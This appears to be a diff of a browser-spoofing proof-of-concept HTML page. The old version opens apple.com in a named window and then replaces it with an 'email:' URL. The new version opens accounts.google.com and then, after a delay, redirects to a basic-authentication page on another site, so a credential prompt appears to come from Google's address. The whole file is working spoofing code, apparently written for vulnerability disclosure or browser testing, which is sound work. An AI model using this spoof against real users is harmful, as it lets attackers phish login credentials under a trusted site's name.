@@ -1,30 +1,17 @@
-<!DOCTYPE HTML>
+
 <html>
-
-<head>
-
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-
-</head>
-
-<body>
-
-<form action="https://www.apple.com" target="aa" method="get" onsubmit="setTimeout('p()',1200);">
-
-<input type="submit">
-
-</form>
-
-<script>
-
-function p() {
-
-  var t = window.open('email:friuf@frfr.com','aa');
-
-}
-
-</script>
-
-</body>
-
+  <head>
+  <script>
+    function spoof() {
+      setTimeout(showAuthentication, 2000);
+      window.open('https://accounts.google.com', 'google');
+     }
+     function showAuthentication() {
+       document.location = "http://www.httpwatch.com/httpgallery/authentication/authenticatedimage/default.aspx";
+     }
+   </script>
+  </head>
+  <body>
+    <a href="#" onclick="spoof()">Tap me!</a>
+  </body>
 </html>
